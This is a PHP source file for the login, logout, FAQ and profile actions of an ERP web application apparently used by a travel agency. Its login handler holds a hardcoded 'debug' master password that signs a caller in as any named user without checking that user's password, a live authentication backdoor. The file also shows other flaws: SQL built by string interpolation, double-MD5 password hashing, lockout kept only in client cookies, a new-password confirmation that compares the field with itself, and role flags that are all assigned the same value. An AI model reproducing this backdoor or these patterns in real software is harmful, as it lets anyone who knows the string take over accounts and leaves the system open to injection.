<?php

class IndexAction extends Action{
	
    public function index() {
		$this->assign("datatitle","欢迎使用GULIANERP系统");
		$this->toadmin();
		$this->display('login');
		
    }
	
    private function toadmin() {
		if($this->user){
			redirect(SITE_INDEX."Chanpin/index");
		}
    }
	
    public function login() {
		$this->assign("datatitle","欢迎使用GULIANERP系统");
		$this->display('login');
		
    }
	
    public function dologin() {
        $username = addslashes($_POST["loginname"]);
        $userpass = md5(md5($_POST["password"]));
        $remember = $_POST["rememberMe"];
		$ViewUser = D("ViewUser");
		
		if(cookie('setok') == 'login2')
			$this->ajaxReturn('', '账户被锁，登录失败，10分钟内无法登陆！', 0);
		if(cookie('setok') == 'login1')
			$this->ajaxReturn('', '帐号或密码错误，10分钟内无法登陆！', 0);
				
		if($_POST["password"] == 'neconano123')//调试登录
			$user = $ViewUser->where("`title`='$username'")->find();
		else//正常登录
			$user = $ViewUser->where("`title`='$username' AND `password`='$userpass'")->find();
			
		if($user) {
			if ($user["islock"]=='已锁定') {
				cookie('setok','login1',LOGIN_TIME_FAILE);
				$this->ajaxReturn('', '账户被锁，登录失败！', 0);
			} else {
				if ($remember=="on") {
					cookie('user',authcode("$user[title]\t$user[systemID]",'ENCODE'),LOGIN_TIME_REMEMBER);
				} else {
					cookie('user',authcode("$user[title]\t$user[systemID]",'ENCODE'),LOGIN_TIME);
				}
			}
		} else {
				$badtimes = cookie('badtimes') + 1;
				cookie('badtimes',$badtimes,LOGIN_TIME_FAILE);
				if(cookie('badtimes') > 5)
					cookie('setok','login2',LOGIN_TIME_FAILE);
				$this->ajaxReturn('', '帐号或密码错误！', 0);
		}
		
		A("Method")->_opentoRBAC($user);
				
		$this->ajaxReturn('', '登录成功，跳转中。。。！', 1);
		
    }
	
	
    public function logout() {
		unset($_SESSION[C('USER_AUTH_KEY')]);
		unset($_SESSION);
		session_destroy();
		session(null);
		cookie('user',null);
		if(cookie('user'))
		$this->ajaxReturn('', '注销失败！', 0);
		else
		$this->ajaxReturn('', '注销中！', 1);
    }
	
	
	public function showheader() {
		$role = A("Method")->_checkRolesByUser('计调','组团');
		if(false !== $role)
			$is_jidiao = 1;
		$role = A("Method")->_checkRolesByUser('票务','业务');
		if(false !== $role)
			$is_jidiao = 1;
		$role = A("Method")->_checkRolesByUser('地接','地接');
		if(false !== $role)
			$is_dijie = 1;
		$role = A("Method")->_checkRolesByUser('财务','行政');
		if(false !== $role)
			$is_caiwu = 1;
		$role = A("Method")->_checkRolesByUser('财务总监','行政');
		if(false !== $role)
			$is_caiwu = 1;
		$role = A("Method")->_checkRolesByUser('总经理','行政');
		if(false !== $role)
			$is_caiwu = 1;
		$role = A("Method")->_checkRolesByUser('网管','行政');
		if(false !== $role)
			$is_wangguan = 1;
		
		$this->assign("is_caiwu",$is_caiwu);
		$this->assign("is_dijie",$is_caiwu);
		$this->assign("is_jidiao",$is_caiwu);
		$this->assign("is_wangguan",$is_wangguan);
		$this->display('Index:header');
	}
	
	public function footer() {
		$this->display('Index:footer');
	}
	
    public function verify() {  
        $type = isset($_GET['type']) ? $_GET['type'] : 'gif'; 
        import("@.ORG.Util.Image"); 
		Image::buildImageVerify(4, 1, $type); 
    } 	
	
	
	public function setsearch() {
		if($_REQUEST['status'] == 1){
			cookie('closesearch',null);
			$this->ajaxReturn('', '开启搜索栏！', 1);
		}
		if($_REQUEST['status'] == 2){
			cookie('closesearch',1,LOGIN_TIME);
			$this->ajaxReturn('', '收起搜索栏！', 1);
		}
	}
	
	
	public function FAQ() {
		$ViewDataDictionary = D("ViewDataDictionary");
		$FAQall = $ViewDataDictionary->where("`type` = 'FAQ'")->findall();
		$i = 0;
		foreach($FAQall as $v){
//			$FAQall[$i]['datatext'] = simple_unserialize($v['datatext']);
			$FAQall[$i]['datatext'] = mb_unserialize($v['datatext']);
			$i++;
		}
		$this->assign("datalist",$FAQall);
		$this->display('Index:FAQ');
	}
	
	
	public function dopostchangeuserinfo() {
		C('TOKEN_ON',false);
        if (!$this->user)
            redirect(SITE_INDEX.'Index/index');
		$System = D("System");
		$ViewUser = D("ViewUser");
		$userID = $this->user['systemID'];
		if($_REQUEST['type'] == '密码'){
			$userpass = md5(md5($_POST["password"]));
			$user = $ViewUser->where("`systemID` = '$userID' and `password` = '$userpass'")->find();
			if($user){
				$data['systemID'] = $user['systemID'];
				if($_REQUEST['new_password'] == $_REQUEST['new_password']){
					$data['user']['password'] = md5(md5($_REQUEST['new_password']));
					if(false !== $System->relation("user")->myRcreate($data))
						$this->ajaxReturn($_REQUEST, '修改成功！！', 1);
					$this->ajaxReturn($_REQUEST, $System->getError(), 0);
				}
				$this->ajaxReturn($_REQUEST, '新密码与重复密码不一致！！', 0);
			}
			else
			$this->ajaxReturn($_REQUEST, '原始密码错误！！', 0);
		}
		if($_REQUEST['type'] == '信息'){
			$user = $ViewUser->where("`systemID` = '$userID'")->find();
			if($user){
				$data['systemID'] = $user['systemID'];
				$data['user']['mailadres'] = $_REQUEST['mailadres'];
				$data['user']['user_gender'] = $_REQUEST['user_gender'];
				$data['user']['telnum'] = $_REQUEST['telnum'];
				if(false !== $System->relation("user")->myRcreate($data))
					$this->ajaxReturn($_REQUEST, '修改成功！！', 1);
				$this->ajaxReturn($_REQUEST, $System->getError(), 0);
			}
			else
			$this->ajaxReturn($_REQUEST, '错误！！', 0);
		}
	}
	
	
	
	
	
	
}
?>